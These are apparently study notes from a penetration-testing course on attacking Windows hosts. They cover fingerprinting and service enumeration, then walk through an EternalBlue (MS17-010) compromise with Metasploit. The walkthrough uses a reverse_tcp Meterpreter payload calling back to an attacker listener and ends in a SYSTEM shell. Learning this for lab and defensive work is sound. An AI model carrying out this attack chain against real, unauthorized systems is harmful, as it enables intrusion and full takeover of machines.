# 🪟 Infiltrating Windows

---

## 🎯 Big Picture

Windows has a **large attack surface** because of its widespread use and the huge number of services/features it provides.

A typical Windows exploitation workflow is:

```text
🔎 Enumerate
    ↓
🪟 Identify Windows
    ↓
🔍 Enumerate Services
    ↓
🎯 Find Vulnerability
    ↓
💥 Validate Exploitability
    ↓
📦 Choose Exploit + Payload
    ↓
🚀 Execute
    ↓
🐚 Receive Shell
    ↓
🔎 Post-Exploitation
```

The key lesson:

> **Enumeration is often the most important part of the attack chain.**

---

# 💥 Prominent Windows Vulnerabilities

|Vulnerability|What it is|
|---|---|
|`MS08-067`|SMB vulnerability allowing remote exploitation; famously used by **Conficker**|
|`MS17-010 / EternalBlue`|SMBv1 vulnerability allowing remote code execution|
|`PrintNightmare`|Windows Print Spooler vulnerabilities that can lead to code execution/privilege escalation|
|`BlueKeep`|`CVE-2019-0708` — RDP remote code execution vulnerability|
|`Sigred`|`CVE-2020-1350` — Windows DNS Server vulnerability|
|`SeriousSam`|`CVE-2021-36934` — improper permissions involving Windows registry/SAM-related files|
|`Zerologon`|`CVE-2020-1472` — Netlogon cryptographic flaw affecting Active Directory|

### 🧠 Remember

```text
SMB  → MS08-067 / EternalBlue
RDP  → BlueKeep
Print Spooler → PrintNightmare
DNS  → Sigred
AD / Netlogon → Zerologon
```

---

# 🔎 Enumerating & Fingerprinting Windows

Before attacking a host, determine:

```text
Is it Windows?
      ↓
What version?
      ↓
What services?
      ↓
What versions of those services?
      ↓
Are any vulnerable?
```

There are several ways to fingerprint Windows.

---

## 1️⃣ TTL Fingerprinting

A `ping` response contains a **TTL (Time To Live)** value.

[## TTL values by OS](https://subinsb.com/default-device-ttl-values/)

Windows commonly starts with a TTL around:

```text
32
128  ← very common
```

Example:

```bash
ping 192.168.86.39
```

Output:

```text
64 bytes from 192.168.86.39:
icmp_seq=0 ttl=128 time=102.920 ms
```

### 🧠 Why does TTL help?

Every router/hop that forwards a packet decreases its TTL.

So if you receive:

```text
TTL = 128
```

the original TTL was likely `128`, suggesting Windows.

⚠️ **TTL is only a clue, not proof.**

Network distance can reduce the value, and devices/firewalls can alter behavior.

---

# 2️⃣ Nmap OS Detection

Nmap can fingerprint the operating system using:

```bash
sudo nmap -v -O <TARGET>
```

### Important option

```text
-O
```

= **OS detection**

Example result:

```text
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
```

Nmap determines this by analyzing characteristics of the target's **TCP/IP stack** and comparing them against known OS fingerprints.

---

## 🛠️ Useful Nmap Options

```bash
sudo nmap -O <TARGET>
```

OS detection.

```bash
sudo nmap -A <TARGET>
```

Aggressive detection:

```text
OS detection
+
Version detection
+
NSE scripts
+
Traceroute
```

```bash
sudo nmap -Pn <TARGET>
```

Treat the host as being up even if normal host discovery fails.

### 🧠 If OS detection isn't working

Try:

```bash
sudo nmap -A -Pn <TARGET>
```

---

# 🔍 Common Windows Ports

Some ports/services are especially useful indicators:

|Port|Service|Why interesting?|
|--:|---|---|
|`135`|MSRPC|Windows RPC|
|`139`|NetBIOS|Older Windows networking|
|`445`|SMB|Extremely important Windows attack surface|
|`3389`|RDP|Remote Desktop|
|`80`|HTTP|Web server|
|`443`|HTTPS|Secure web server|

### 🚨 Especially remember:

```text
135 → RPC
139 → NetBIOS
445 → SMB
3389 → RDP
```

Seeing:

```text
135
139
445
```

together is a **strong Windows indicator**.

---

# 🏷️ Banner Grabbing

Once we know what ports are open, we want to know:

```text
What service?
What version?
What software?
```

Nmap can use NSE scripts for this.

Example:

```bash
sudo nmap -v <TARGET> --script banner.nse
```

Example:

```text
902/tcp open  ...
| banner:
| 220 VMware Authentication Daemon Version 1.10
```

This tells us that the service is associated with **VMware**.

### 🧠 General principle

```text
Open port
   ↓
Identify service
   ↓
Grab banner/version
   ↓
Search for vulnerabilities
```

---

# 📦 Windows Payload File Types

When working with Windows payloads, the delivery mechanism influences which file type makes sense.

## 🔹 DLL

**Dynamic Link Library**

```text
.dll
```

Contains shared code/data used by Windows programs.

Security relevance:

```text
DLL injection
DLL hijacking
Privilege escalation
Code execution
```

---

## 🔹 Batch

```text
.bat
```

Text-based Windows command scripts.

Useful for:

```text
Automating commands
System administration
Simple execution
```

Example concept:

```text
script.bat
    ↓
runs multiple commands
```

---

## 🔹 VBScript

```text
.vbs
```

Microsoft scripting language.

Historically relevant to:

```text
Phishing
Script execution
User-assisted attacks
```

---

## 🔹 MSI

```text
.msi
```

Windows Installer package.

Windows can execute/install MSI packages through:

```text
msiexec
```

---

## 🔹 PowerShell

PowerShell is both:

```text
🐚 Shell
+
📜 Scripting language
```

It works heavily with:

```text
.NET
Objects
Cmdlets
Modules
```

This makes it considerably more powerful than traditional CMD.

---

# 🧰 Payload Generation Resources

Common resources/tools include:

| Tool                        | Purpose                                     |
| --------------------------- | ------------------------------------------- |
| **MSFvenom / Metasploit**   | Payload generation + exploitation framework |
| **Payloads All The Things** | Payloads, techniques, cheat sheets          |
| **Mythic**                  | C2 framework                                |
| **Nishang**                 | PowerShell offensive-security scripts       |
| **DarkArmour**              | Windows binary obfuscation                  |

---

# 📤 Payload Transfer

Once a payload exists, it still needs to reach the target.

Possible mechanisms include:

```text
🌐 HTTP/HTTPS
📧 Email
💾 USB
📁 SMB
📡 FTP/TFTP
💥 Metasploit exploit modules
```

### Impacket

**Impacket** is a Python-based collection of tools for interacting with Windows/network protocols.

Important areas include:

```text
SMB
RPC
WMI
Kerberos
PsExec
SMB servers
```

---

# 🎯 Example Windows Compromise Workflow

Let's break the example down into the important reasoning rather than memorizing every command.

---

## 1️⃣ Enumerate

```bash
nmap -v -A 10.129.201.97
```

Results:

```text
80   → IIS
135  → MSRPC
139  → NetBIOS
445  → SMB
```

Nmap also identifies:

```text
Windows Server 2016
```

And:

```text
Computer name: SHELLS-WINBLUE
Workgroup: WORKGROUP
```

### 🧠 What have we learned?

```text
OS       → Windows Server 2016
Web      → IIS 10.0
SMB      → exposed
RPC      → exposed
NetBIOS  → exposed
Domain   → not domain joined
```

Now we have potential attack paths.

---

# 2️⃣ Validate a Vulnerability

Because SMB is exposed and the OS falls within the historically affected range, we can check for:

```text
MS17-010 / EternalBlue
```

Metasploit has a scanner:

```text
auxiliary/scanner/smb/smb_ms17_010
```

The important distinction:

```text
Scanner
    ↓
Checks vulnerability
    ↓
Does NOT necessarily exploit it
```

Example result:

```text
Host is likely VULNERABLE to MS17-010!
```

Now we have evidence that exploitation may be possible.

---

# 3️⃣ Choose an Exploit

Metasploit can search for relevant modules:

```text
search eternal
```

Possible results include:

```text
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms17_010_psexec
auxiliary/scanner/smb/smb_ms17_010
```

Notice the difference:

```text
auxiliary/scanner
        ↓
      CHECK

exploit/...
        ↓
      ATTACK
```

---

# 4️⃣ Choose the Payload

The exploit can be combined with a payload.

Example:

```text
windows/meterpreter/reverse_tcp
```

Conceptually:

```text
Exploit
   +
Payload
   ↓
Code execution
   ↓
Reverse connection
   ↓
Meterpreter session
```

---

# 🌐 RHOSTS vs LHOST

This is extremely important.

### `RHOSTS`

```text
Remote Host(s)
```

The **target**.

```text
RHOSTS = 10.129.201.97
```

Means:

> Attack this machine.

---

### `LHOST`

```text
Local Host
```

The **attacker/listener machine**.

```text
LHOST = 10.10.14.12
```

Means:

> The target should connect back to me here.

---

### Visualize it

```text
        ATTACKER
       10.10.14.12
             ▲
             │
       reverse connection
             │
             │
       10.129.201.97
          TARGET
```

Therefore:

```text
RHOSTS = TARGET
LHOST  = ATTACKER
```

---

# 5️⃣ LPORT

```text
LPORT
```

is the port on the attacker side where the reverse connection will be received.

Example:

```text
LHOST = 10.10.14.12
LPORT = 4444
```

Conceptually:

```text
Target
   │
   │ connect back
   ▼
10.10.14.12:4444
```

---

# 6️⃣ Execute

Once the exploit and payload are configured:

```text
exploit
```

Metasploit starts the handler:

```text
Started reverse TCP handler
```

Then the target executes the payload and connects back.

Eventually:

```text
Meterpreter session 1 opened
```

---

# 👑 SYSTEM

The example then runs:

```text
meterpreter > getuid
```

Result:

```text
Server username: NT AUTHORITY\SYSTEM
```

`SYSTEM` is the highly privileged local Windows account.

So the result is essentially:

```text
Remote vulnerability
       ↓
Code execution
       ↓
Meterpreter
       ↓
SYSTEM
```

---

# 🐚 Meterpreter vs Windows Shell

Meterpreter is **not the same thing as CMD**.

You can move from Meterpreter into the native Windows shell:

```text
meterpreter > shell
```

Then you see:

```text
C:\Windows\system32>
```

That indicates:

```text
cmd.exe
```

---

# 🖥️ CMD vs PowerShell

## CMD

Traditional Windows command shell:

```text
C:\Windows\system32>
```

Good for:

```text
Simple commands
Basic administration
Batch scripts
Older Windows systems
```

---

## PowerShell

PowerShell prompt:

```text
PS C:\Windows\system32>
```

Good for:

```text
Advanced scripting
Cmdlets
.NET
Objects
Automation
Cloud administration
```

---

# ⚔️ CMD vs PowerShell

||CMD|PowerShell|
|---|---|---|
|Age|Older|Newer|
|Output|Text|Objects|
|Scripting|Basic|Advanced|
|Cmdlets|❌|✅|
|.NET integration|❌|✅|
|Batch scripts|`.bat`|`.ps1`|
|Older Windows|More likely available|May not exist|
|Complexity|Simple|Powerful|

### 🧠 Easy rule

```text
Need something simple?
        ↓
       CMD

Need scripting / automation / .NET?
        ↓
    PowerShell
```

---

# 🐧 Windows Subsystem for Linux — WSL

**WSL** allows Linux environments to run inside Windows.

Conceptually:

```text
Windows
   │
   └── WSL
        │
        └── Linux environment
```

This is important from a security perspective because it introduces another environment and additional tooling into a Windows system.

For defenders, the important lesson is:

> **Every additional subsystem or feature can expand the attack surface.**

---

# 🧠 Key Takeaways

```text
┌──────────────────────────────────────────────┐
│              WINDOWS ENUMERATION             │
├──────────────────────────────────────────────┤
│                                              │
│ TTL ≈ 128        → Possible Windows         │
│                                              │
│ -O               → Nmap OS detection        │
│ -A               → Aggressive enumeration   │
│ -Pn              → Skip host discovery      │
│                                              │
│ 135              → MSRPC                    │
│ 139              → NetBIOS                  │
│ 445              → SMB                      │
│ 3389             → RDP                      │
│                                              │
│ banner.nse       → Banner/service info      │
│                                              │
└──────────────────────────────────────────────┘
```

```text
┌──────────────────────────────────────────────┐
│              WINDOWS ATTACK FLOW              │
├──────────────────────────────────────────────┤
│                                              │
│ Enumerate                                     │
│     ↓                                        │
│ Fingerprint Windows                          │
│     ↓                                        │
│ Enumerate services                           │
│     ↓                                        │
│ Identify vulnerability                       │
│     ↓                                        │
│ Validate vulnerability                       │
│     ↓                                        │
│ Select exploit + payload                    │
│     ↓                                        │
│ Execute                                      │
│     ↓                                        │
│ Receive shell                                │
│     ↓                                        │
│ Post-exploitation                            │
│                                              │
└──────────────────────────────────────────────┘
```

### ⭐ Most important concepts

**1. `RHOSTS` = target**

**2. `LHOST` = attacker/listener**

**3. `LPORT` = listener port**

**4. Scanner ≠ exploit**

```text
scanner → determines whether something may be vulnerable
exploit  → attempts to take advantage of it
```

**5. Meterpreter ≠ CMD**

```text
Meterpreter
    ↓ shell
cmd.exe
```

**6. CMD vs PowerShell**

```text
CMD        → simple / traditional
PowerShell → scripting / objects / .NET
```

**7. Enumeration comes first**

```text
Don't blindly exploit.
Understand the host first.
```